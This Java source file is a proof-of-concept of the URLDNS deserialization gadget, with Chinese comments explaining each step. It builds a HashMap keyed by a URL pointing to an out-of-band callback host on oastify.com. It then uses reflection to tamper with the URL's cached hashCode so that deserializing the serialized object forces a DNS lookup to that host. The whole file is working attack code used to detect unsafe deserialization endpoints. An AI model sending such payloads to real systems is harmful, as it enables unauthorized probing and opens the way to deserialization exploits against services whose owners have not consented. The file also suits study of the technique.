import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.rmi.server.ExportException;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {

        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
        URL url = new URL("http://i0j5ue41995dffiq1r499r2sxj3arz.oastify.com");
        Class c = url.getClass();
        Field hashCodeF = c.getDeclaredField("hashCode");
        hashCodeF.setAccessible(true);
        hashCodeF.set(url,123);

//      如果url对象中的hashcode!=-1，就直接返回，否则会进行一次hashcode的计算
        hashMap.put(url,1);
//      再改为-1，在反序列化的时候，会调用URL的hashcode方法，会进行一次dns解析
//      反序列化时，会自动调用自身的readObject方法
        hashCodeF.set(url,-1);

        Utils.serialize(hashMap);
        Utils.EXP();

    }

}
